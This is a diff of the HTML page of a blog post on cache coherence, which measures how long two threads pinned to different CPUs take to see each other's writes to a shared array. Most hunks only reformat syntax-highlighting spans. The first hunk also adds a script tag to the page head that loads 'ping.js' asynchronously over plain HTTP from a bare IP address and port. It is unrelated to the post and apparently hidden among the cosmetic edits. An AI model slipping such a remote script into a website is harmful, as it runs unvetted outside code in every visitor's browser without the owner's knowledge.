@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -90,53 +92,53 @@ February 15, 2020
 <p>This post explores what is behind this <em>“eventually”</em> term.<!--more--></p>
 <p>Consider the <a href="/assets/threading/cache-coherence/rccnt.c">following function</a>.</p>
 <p>It is executed by two threads that increment by one the values of an array one at time: one waiting for even numbers before incrementing, the other waiting for odd numbers.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">loop</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">ctx_t</span><span class="w"> </span><span class="o">*</span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">counters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">counters</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">n</span><span class="p">;</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">loop</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">ctx_t</span><span class="w"> </span><span class="o">*</span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">counters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">counters</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">n</span><span class="p">;</span>
 
-<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ROUNDS</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">DATASZ</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">cnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">                </span><span class="o">++</span><span class="n">cnt</span><span class="p">;</span><span class="w"></span>
-<span class="w">            </span><span class="p">}</span><span class="w"></span>
-<span class="w">            </span><span class="o">++</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"></span>
-<span class="w">            </span><span class="n">counters</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cnt</span><span class="p">;</span><span class="w"></span>
-<span class="w">        </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ROUNDS</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">DATASZ</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">cnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">++</span><span class="n">cnt</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="o">++</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="w">            </span><span class="n">counters</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cnt</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>The threads synchronize themselves with a <em>busy-loop</em> but the shared array <code><span class="highlight-candombe-inline"><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"></span></span></code> is not protected in any way so there is a <em>race condition</em> there.</p>
+<p>The threads synchronize themselves with a <em>busy-loop</em> but the shared array <code><span class="highlight-candombe-inline"><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">data</span></span></code> is not protected in any way so there is a <em>race condition</em> there.</p>
 <p>As we saw in a <a href="/articles/2020/02/07/Compiler-Optimizations-under-RC.html">previous post</a> we can avoid any corruption due the RC for this so simple program if we don’t allow the compiler to optimize the code.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ gcc --version
-gcc <span class="o">(</span>Debian <span class="m">6</span>.3.0-18+deb9u1<span class="o">)</span> <span class="m">6</span>.3.0 <span class="m">20170516</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>gcc<span class="w"> </span>--version
+gcc<span class="w"> </span><span class="o">(</span>Debian<span class="w"> </span><span class="m">6</span>.3.0-18+deb9u1<span class="o">)</span><span class="w"> </span><span class="m">6</span>.3.0<span class="w"> </span><span class="m">20170516</span>
 
-$ gcc -std<span class="o">=</span>c11 -lpthread -O0 -ggdb -DDATASZ<span class="o">=</span><span class="m">8</span> -o rccnt rccnt.c
+$<span class="w"> </span>gcc<span class="w"> </span>-std<span class="o">=</span>c11<span class="w"> </span>-lpthread<span class="w"> </span>-O0<span class="w"> </span>-ggdb<span class="w"> </span>-DDATASZ<span class="o">=</span><span class="m">8</span><span class="w"> </span>-o<span class="w"> </span>rccnt<span class="w"> </span>rccnt.c
 </code></pre></div>
 
 <p>If the two threads see the same value <em>eventually</em>, how much <em>“time”</em> does it take?</p>
 <p><label for='ClRoYXQgaXMgdGhlIHB1cnBvc2Ugb2YgYGNvdW50ZXJzYDogdHJhY2sgaG93IG1hbnkgY3ljbGVzIHRvb2sgc2VlIHRoZQpleHBlY3RlZCB2YWx1ZSBhdCBlYWNoIGluZGV4LiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='ClRoYXQgaXMgdGhlIHB1cnBvc2Ugb2YgYGNvdW50ZXJzYDogdHJhY2sgaG93IG1hbnkgY3ljbGVzIHRvb2sgc2VlIHRoZQpleHBlY3RlZCB2YWx1ZSBhdCBlYWNoIGluZGV4LiBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-That is the purpose of <code><span class="highlight-candombe-inline"><span class="n">counters</span><span class="w"></span></span></code>: track how many cycles took see the expected value at each index.
+That is the purpose of <code><span class="highlight-candombe-inline"><span class="n">counters</span></span></code>: track how many cycles took see the expected value at each index.
 </span></p>
 <p>How many times a busy-loop cycled gives us a rough estimation.</p>
 <p><label for='ClNlZSBtYW4gcGFnZSBvZiBgcHRocmVhZF9hdHRyX3NldGFmZmluaXR5X25wYCBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='ClNlZSBtYW4gcGFnZSBvZiBgcHRocmVhZF9hdHRyX3NldGFmZmluaXR5X25wYCBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-See man page of <code><span class="highlight-candombe-inline"><span class="n">pthread_attr_setaffinity_np</span><span class="w"></span></span></code>
+See man page of <code><span class="highlight-candombe-inline"><span class="n">pthread_attr_setaffinity_np</span></span></code>
 </span></p>
 <p>To play with different cpus, the program sets the cpu’s affinity of each thread configurable from the command line.</p>
 <p>For example, to set the affinity of both threads to the cpu number 0 we do:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ./rccnt <span class="m">0</span> <span class="m">0</span>
-<span class="m">4960841</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span>
-<span class="m">4846049</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span> <span class="m">0</span>
-Sum <span class="m">160</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>./rccnt<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>
+<span class="m">4960841</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>
+<span class="m">4846049</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>
+Sum<span class="w"> </span><span class="m">160</span>
 </code></pre></div>
 
 <blockquote>
@@ -149,7 +151,7 @@ Sum <span class="m">160</span>
 </code></pre></div>
 
 <p><figure><figcaption><span markdown='1'>
-In the x-axis we have the index of each element (of an array of <code><span class="highlight-candombe-inline"><span class="n">DATASZ</span><span class="o">==</span><span class="mi">8</span><span class="w"></span></span></code> elements); in the y-axis the amount of cycles need until the value got the correct parity.
+In the x-axis we have the index of each element (of an array of <code><span class="highlight-candombe-inline"><span class="n">DATASZ</span><span class="o">==</span><span class="mi">8</span></span></code> elements); in the y-axis the amount of cycles need until the value got the correct parity.
 </span></figcaption>
 <img  class='' alt='' src='/img/threading/cache-coherence/cnt-cpu0-cpu0.png' /></figure></p>
 <p>Weird?</p>
@@ -172,7 +174,7 @@ In the x-axis we have the index of each element (of an array of <code><span clas
 <p><figure><figcaption><span markdown='1'>
 Plot how many cycles happen when the first thread ran in the cpu 0 and the other ran in any other cpu.
 <br /><br />
-Each point represents the cycles that happen in one array access in one execution of <code><span class="highlight-candombe-inline"><span class="n">rccnt</span><span class="w"></span></span></code>.
+Each point represents the cycles that happen in one array access in one execution of <code><span class="highlight-candombe-inline"><span class="n">rccnt</span></span></code>.
 <br /><br />
 Note how values around and greater than 1000 are outliers.
 <br /><br />
@@ -221,7 +223,7 @@ For this post I will assume that L1 and L2 are per socket and L3 shared for all 
 </code></pre></div>
 
 <p><figure><figcaption><span markdown='1'>
-Plot a heatmap comparing each cpu agaist each other. Outliers (<code><span class="highlight-candombe-inline"><span class="n">cycles</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1000</span><span class="w"></span></span></code>) are ignored and the mean is used as the aggregation function.
+Plot a heatmap comparing each cpu agaist each other. Outliers (<code><span class="highlight-candombe-inline"><span class="n">cycles</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1000</span></span></code>) are ignored and the mean is used as the aggregation function.
 <br /><br />
 The major diagonal (when both threads use the same cpu) has the lowest values but this is because we removed the outliers so it is not entirely correct.
 <br /><br />
@@ -254,7 +256,7 @@ High-level diagram. The colours are qualitative following the same color palette
 </span></figcaption>
 <img  class='' alt='' src='/img/threading/cache-coherence/cpus-cache-arch.png' /></figure></p>
 <h2 id="open-questions">Open questions</h2>
-<p>We used an array of 8 elements of <code><span class="highlight-candombe-inline"><span class="kt">int</span><span class="w"></span></span></code> which gives us 32 bytes. Current technology uses cache lines of 64 bytes. Will the results in this post change if we use larger arrays?</p>
+<p>We used an array of 8 elements of <code><span class="highlight-candombe-inline"><span class="kt">int</span></span></code> which gives us 32 bytes. Current technology uses cache lines of 64 bytes. Will the results in this post change if we use larger arrays?</p>
 <p>We saw how two threads running in the same cpu fight each other because none <em>yields</em> the cpu; <a href="http://man7.org/linux/man-pages/man2/sched_yield.2.html">sched_yield</a> is POSIX function to <em>relinquish</em> the cpu. What would happen?</p>
 <p>The heatmap was not entirely symmetric. Does it mean that we need to collect more data and try to understand and suppress the noise, or is there something else?</p>
 <p>What about <a href="https://en.wikipedia.org/wiki/Non-uniform_memory_access">NUMA</a> (Non Uniform Memory Address)? Could the results shown in this post be explained by it?</p>
